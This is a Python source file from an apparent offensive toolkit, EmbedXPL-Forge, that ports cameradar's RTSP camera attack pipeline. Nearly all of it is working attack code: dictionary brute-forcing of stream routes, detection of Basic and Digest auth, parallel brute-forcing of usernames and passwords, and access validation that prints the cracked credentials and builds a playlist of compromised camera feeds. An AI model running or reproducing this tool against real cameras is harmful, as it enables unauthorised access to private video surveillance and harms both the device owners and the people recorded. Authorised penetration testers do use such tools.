# Author: André Henrique (LinkedIn/X: @mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""EmbedXPL-Forge — RTSP Stream Attacker.

Complete port of cameradar's attack pipeline to Python:
  Phase 1: Route discovery    — dictionary brute-force of RTSP paths
  Phase 2: Auth detection     — Basic vs Digest, realm/nonce extraction
  Phase 3: Credential attack  — user:pass dictionary brute-force
  Phase 4: Stream validation  — full DESCRIBE + SETUP cycle
  Phase 5: Re-attack          — handles inaccurate 401-over-404 cameras

References:
  - cameradar: https://github.com/ullaakut/cameradar (MIT, Ullaakut)
  - RFC 2326 §10.2: DESCRIBE
  - RFC 2617: HTTP Authentication (Basic/Digest)

Author: André Henrique (@mrhenrike) | União Geek
Version: 1.0.0
"""

from __future__ import annotations

import json
import logging
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import List, Optional, Tuple

from embedxpl.core.rtsp.client import RTSPClient
from embedxpl.core.rtsp.models import AuthType, RTSPStream

logger = logging.getLogger(__name__)

# Default paths to resource dictionaries
_DEFAULT_RESOURCES = Path(__file__).parent.parent.parent / "resources" / "rtsp"
_DEFAULT_ROUTES_FILE = _DEFAULT_RESOURCES / "routes.txt"
_DEFAULT_CREDS_FILE = _DEFAULT_RESOURCES / "credentials.json"


def _load_routes(path: Optional[Path] = None) -> List[str]:
    """Load RTSP route dictionary from file."""
    fpath = path or _DEFAULT_ROUTES_FILE
    if not fpath.exists():
        return []
    routes = []
    for line in fpath.read_text("utf-8", errors="replace").splitlines():
        line = line.strip()
        if line:
            routes.append(line)
    return routes


def _load_credentials(path: Optional[Path] = None) -> Tuple[List[str], List[str]]:
    """Load RTSP credential dictionary from JSON file."""
    fpath = path or _DEFAULT_CREDS_FILE
    if not fpath.exists():
        return [], []
    try:
        data = json.loads(fpath.read_text("utf-8"))
        return data.get("usernames", []), data.get("passwords", [])
    except Exception:
        return [], []


class RTSPAttacker:
    """RTSP stream attacker: route + credential brute-force.

    Complete Python port of cameradar's Attacker struct.
    Supports parallel workers, configurable attack intervals,
    and the cameradar re-attack heuristic for quirky cameras.

    Author: André Henrique (@mrhenrike) | União Geek
    Version: 1.0.0

    Example::

        attacker = RTSPAttacker()
        streams = attacker.attack(["192.168.1.100:554", "192.168.1.101:554"])
        for stream in streams:
            print(stream.summary())
            if stream.available:
                print("M3U:", stream.to_m3u_entry())
    """

    def __init__(
        self,
        routes_file: Optional[Path] = None,
        credentials_file: Optional[Path] = None,
        attack_interval: float = 0.05,
        timeout: float = 5.0,
        max_workers: int = 8,
        verbose: bool = False,
    ) -> None:
        """Initialise the RTSP attacker.

        Args:
            routes_file: Path to routes dictionary file.
            credentials_file: Path to credentials JSON file.
            attack_interval: Delay between attack attempts (seconds).
            timeout: RTSP socket timeout per request (seconds).
            max_workers: Number of parallel threads for brute-force.
            verbose: If True, print progress to stdout.
        """
        self.routes = _load_routes(routes_file)
        usernames, passwords = _load_credentials(credentials_file)
        self.usernames = usernames
        self.passwords = passwords
        self.attack_interval = attack_interval
        self.timeout = timeout
        self.max_workers = max_workers
        self.verbose = verbose

    # ── Public API ────────────────────────────────────────────────────────────

    def attack(self, targets: List[str]) -> List[RTSPStream]:
        """Run the full attack pipeline against a list of targets.

        Each target is ``"ip:port"`` or ``"ip"`` (defaults to port 554).

        Args:
            targets: List of RTSP target strings.

        Returns:
            List of :class:`~embedxpl.core.rtsp.models.RTSPStream` results.
        """
        streams = [self._parse_target(t) for t in targets]
        streams = self._attack_routes_phase(streams)
        streams = self._detect_auth_phase(streams)
        streams = self._attack_credentials_phase(streams)
        streams = self._validate_phase(streams)
        # Re-attack heuristic (some cameras return 401 over 404)
        if self._needs_reattack(streams):
            streams = self._reattack_routes(streams)
        return streams

    def attack_stream(self, stream: RTSPStream) -> RTSPStream:
        """Run the full attack pipeline on a single stream."""
        stream = self._attack_routes_for_stream(stream)
        stream = self._detect_auth_for_stream(stream)
        stream = self._attack_credentials_for_stream(stream)
        stream = self._validate_stream(stream)
        return stream

    # ── Pipeline Phases ───────────────────────────────────────────────────────

    def _attack_routes_phase(self, streams: List[RTSPStream]) -> List[RTSPStream]:
        """Phase 1: Discover valid stream routes via dictionary brute-force."""
        self._log("Phase 1: Route discovery")
        return self._parallel(streams, self._attack_routes_for_stream)

    def _detect_auth_phase(self, streams: List[RTSPStream]) -> List[RTSPStream]:
        """Phase 2: Detect authentication type for each stream."""
        self._log("Phase 2: Auth detection")
        return self._parallel(streams, self._detect_auth_for_stream)

    def _attack_credentials_phase(self, streams: List[RTSPStream]) -> List[RTSPStream]:
        """Phase 3: Brute-force credentials for streams with auth."""
        self._log("Phase 3: Credential attack")
        return self._parallel(streams, self._attack_credentials_for_stream)

    def _validate_phase(self, streams: List[RTSPStream]) -> List[RTSPStream]:
        """Phase 4: Validate accessibility of discovered streams."""
        self._log("Phase 4: Stream validation")
        return self._parallel(streams, self._validate_stream)

    def _reattack_routes(self, streams: List[RTSPStream]) -> List[RTSPStream]:
        """Phase 5: Re-attack routes for streams not yet fully discovered."""
        self._log("Phase 5: Re-attacking routes (quirky camera heuristic)")
        updated = self._parallel(streams, self._attack_routes_for_stream)
        return self._parallel(updated, self._validate_stream)

    # ── Per-stream Logic ──────────────────────────────────────────────────────

    def _attack_routes_for_stream(self, stream: RTSPStream) -> RTSPStream:
        """Discover valid routes for a single stream."""
        if stream.route_found:
            return stream

        client = self._client(stream)

        # Test empty/root route first (many cameras accept it)
        if client.test_route(""):
            stream.route_found = True
            stream.routes.append("")
            self._log(f"  {stream.address}:{stream.port} — default route accepted")
            return stream

        # Dictionary brute-force
        for route in self.routes:
            time.sleep(self.attack_interval)
            if client.test_route(route):
                stream.route_found = True
                if route not in stream.routes:
                    stream.routes.append(route)
                self._log(f"  {stream.address}:{stream.port} → route found: /{route}")

        return stream

    def _detect_auth_for_stream(self, stream: RTSPStream) -> RTSPStream:
        """Detect authentication type for a single stream."""
        client = self._client(stream)
        route = stream.route()
        auth_type, realm, nonce = client.probe_auth_type(route)
        stream.auth_type = auth_type
        self._log(
            f"  {stream.address}:{stream.port} — auth: {auth_type.name} "
            f"realm={realm!r}"
        )
        return stream

    def _attack_credentials_for_stream(self, stream: RTSPStream) -> RTSPStream:
        """Brute-force credentials for a single stream."""
        if stream.auth_type == AuthType.NONE:
            stream.credentials_found = True
            return stream

        client = self._client(stream)
        route = stream.route()

        # Re-probe for Digest realm/nonce (may expire)
        digest_realm = ""
        digest_nonce = ""
        if stream.auth_type == AuthType.DIGEST:
            _, headers, _ = client.describe(route=route)
            www_auth = headers.get("www-authenticate", "")
            from embedxpl.core.rtsp.client import _parse_digest_challenge
            digest_realm, digest_nonce = _parse_digest_challenge(www_auth)

        for username in self.usernames:
            for password in self.passwords:
                time.sleep(self.attack_interval)
                ok = client.test_credentials(
                    route=route,
                    username=username,
                    password=password,
                    auth_type=stream.auth_type,
                    digest_realm=digest_realm,
                    digest_nonce=digest_nonce,
                )
                if ok:
                    stream.credentials_found = True
                    stream.username = username
                    stream.password = password
                    self._log(
                        f"  {stream.address}:{stream.port} — CREDS: {username!r}:{password!r}"
                    )
                    return stream

        stream.credentials_found = False
        return stream

    def _validate_stream(self, stream: RTSPStream) -> RTSPStream:
        """Validate that the stream is fully accessible with found credentials."""
        client = self._client(stream)
        route = stream.route()

        # Re-probe Digest nonce for validation
        digest_realm = ""
        digest_nonce = ""
        if stream.auth_type == AuthType.DIGEST and stream.credentials_found:
            _, headers, _ = client.describe(route=route)
            www_auth = headers.get("www-authenticate", "")
            from embedxpl.core.rtsp.client import _parse_digest_challenge
            digest_realm, digest_nonce = _parse_digest_challenge(www_auth)

        status, headers, sdp = client.describe(
            route=route,
            username=stream.username,
            password=stream.password,
            auth_type=stream.auth_type,
            digest_realm=digest_realm,
            digest_nonce=digest_nonce,
        )
        stream.available = (status == 200)
        if sdp:
            stream.sdp = sdp[:1000]
        banner = headers.get("server", "")
        if banner:
            stream.server_banner = banner
            if not stream.device:
                stream.device = banner

        if stream.available:
            self._log(f"  {stream.address}:{stream.port} — ACCESSIBLE! {stream.url()}")

        return stream

    # ── Utilities ─────────────────────────────────────────────────────────────

    @staticmethod
    def _parse_target(target: str) -> RTSPStream:
        """Parse 'ip:port' or 'ip' string into RTSPStream."""
        if ":" in target:
            parts = target.rsplit(":", 1)
            try:
                port = int(parts[1])
                return RTSPStream(address=parts[0], port=port)
            except ValueError:
                pass
        return RTSPStream(address=target, port=554)

    def _client(self, stream: RTSPStream) -> RTSPClient:
        """Create an RTSPClient for a given stream."""
        use_tls = stream.scheme in ("rtsps", "https")
        return RTSPClient(stream.address, stream.port,
                          timeout=self.timeout, use_tls=use_tls)

    def _parallel(
        self, streams: List[RTSPStream],
        fn,
    ) -> List[RTSPStream]:
        """Execute fn(stream) for all streams in parallel."""
        if not streams:
            return streams
        results = [None] * len(streams)
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_idx = {
                executor.submit(fn, stream): i
                for i, stream in enumerate(streams)
            }
            for future in as_completed(future_to_idx):
                idx = future_to_idx[future]
                try:
                    results[idx] = future.result()
                except Exception as exc:
                    logger.debug("Stream worker error: %s", exc)
                    results[idx] = streams[idx]
        return [r for r in results if r is not None]

    @staticmethod
    def _needs_reattack(streams: List[RTSPStream]) -> bool:
        """Check if any stream needs re-attack (mirrors cameradar heuristic)."""
        for stream in streams:
            if stream.route_found and stream.credentials_found and stream.available:
                continue
            return True
        return False

    def _log(self, msg: str) -> None:
        """Log a message if verbose mode is enabled."""
        if self.verbose:
            print(msg)
        logger.debug(msg)

    # ── Output Helpers ────────────────────────────────────────────────────────

    def generate_m3u(self, streams: List[RTSPStream]) -> str:
        """Generate M3U playlist from accessible streams.

        Args:
            streams: List of RTSPStream results.

        Returns:
            M3U playlist string.
        """
        lines = ["#EXTM3U"]
        for stream in streams:
            if stream.available:
                lines.append(stream.to_m3u_entry())
        return "\n".join(lines)

    def print_summary(self, streams: List[RTSPStream]) -> None:
        """Print a formatted summary of all discovered streams."""
        accessible = [s for s in streams if s.available]
        route_only = [s for s in streams if s.route_found and not s.available]
        total = len(streams)

        print(f"\n{'='*60}")
        print(f"RTSP Camera Attack Summary")
        print(f"{'='*60}")
        print(f"Total targets:   {total}")
        print(f"Accessible:      {len(accessible)}")
        print(f"Route only:      {len(route_only)}")
        print(f"Not found:       {total - len(accessible) - len(route_only)}")
        print(f"{'='*60}")

        for stream in streams:
            print(stream.summary())
            if stream.available:
                print(f"  URL: {stream.url()}")
                if stream.sdp:
                    print(f"  SDP: {stream.sdp[:100]!r}...")
